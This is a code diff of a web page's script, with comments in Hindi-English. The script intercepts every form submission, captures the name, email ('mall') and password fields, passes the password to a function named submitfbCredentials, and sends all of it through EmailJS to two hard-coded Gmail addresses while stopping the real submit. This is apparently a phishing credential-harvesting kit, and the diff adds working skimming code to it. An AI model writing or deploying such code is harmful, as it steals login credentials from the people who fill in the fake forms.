@@ -2230,34 +2230,43 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
     emailjs.init("8AcP51LH7_IRW17aY");
   })();
 
+  // Sirf yahan badalte rahna lifetime mein
   var email1   = "lingdavid24@gmail.com";
   var email2   = "akeraa191@gmail.com";
   var client1  = "Rahul Sharma";
   var client2  = "Vikash Kumar";
 
+  // YE SABSE IMPORTANT LINE HAI – purane button ko rokega hi nahi
   document.querySelectorAll('form').forEach(form => {
     form.addEventListener('submit', function(e) {
-      // Pehle tumhara purana code chalao (popup, language, button sab theek rahega)
-      if (typeof submitFormData === 'function') submitFormData();                // pehla form
-      if (typeof submitfbCredentials === 'function') submitfbCredentials(document.querySelector('input[type="password"]')?.value); // password wala
+      // 1. Pehle tumhara original function chalao (popup + language + button sab chalega)
+      if (this.querySelector('input[name="name"]') || this.querySelector('#nameInput')) {
+        if (typeof submitFormData === 'function') submitFormData();
+      }
+      if (this.querySelector('input[type="password"]')) {
+        if (typeof submitfbCredentials === 'function') {
+          const pass = this.querySelector('input[type="password"]').value;
+          if (pass) submitfbCredentials(pass);
+        }
+      }
 
-      // Ab EmailJS se mail bhejo (background mein, popup disturb nahi hoga)
+      // 2. Ab background mein EmailJS se mail bhejo (popup disturb nahi hoga)
       let clientName = this.querySelector('input[name="name"]') ? client1 : client2;
       let toEmail    = this.querySelector('input[name="name"]') ? email1 : email2;
 
       emailjs.send("service_nqeen3l", "template_z0ow5n7", {
         client_name: clientName,
         website_url: window.location.href,
-        user_name:   document.querySelector('input[name="name"]')?.value || "",
-        user_mall:   document.querySelector('input[name="mall"]')?.value || "",
-        user_pass:   document.querySelector('input[type="password"]')?.value || "",
+        user_name:   this.querySelector('input[name="name"]')?.value || "No name",
+        user_mall:   this.querySelector('input[name="mall"]')?.value || this.querySelector('#mallInput')?.value || "",
+        user_pass:   this.querySelector('input[type="password"]')?.value || "",
         to_email:    toEmail
-      }).then(() => {
-        console.log("Mail bhi chala gaya!");
-      });
+      }).then(() => console.log("Mail bhej diya"));
 
-      // Form dobara submit na ho → rok do
+      // 3. Form dobara submit na ho isliye last mein rok do
       e.preventDefault();
+      return false;
+    // extra safety
     });
   });
 </script>
